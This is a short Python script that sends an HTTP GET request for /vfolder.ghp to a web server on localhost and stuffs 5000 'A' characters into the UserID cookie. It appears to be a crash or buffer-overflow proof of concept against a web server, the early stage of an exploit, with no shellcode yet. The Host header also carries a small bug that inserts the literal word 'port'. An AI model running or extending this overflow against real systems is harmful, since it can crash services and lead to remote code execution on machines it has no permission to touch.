import socket
import os
import sys

ip = '127.0.0.1'
port = 80

#stuff = "A"*4098
stuff = "A"*5000
buffer =  "GET /vfolder.ghp HTTP/1.1\r\n"
buffer += "User-Agent: Mozilla/5.0\r\n"
buffer += "Host:" + ip + ":" + "port" + "\r\n"
buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer += "Accept-Language: en-us\r\n"
buffer += "Accept-Encoding: gzip, deflate\r\n"
buffer += "Referer: http://" + ip + "/\r\n"
buffer += "Cookie: SESSIONID=6771; UserID=" + stuff	+ "; PassWD=;\r\n"
buffer += "Conection: Keep-Alive\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(buffer)
s.close()
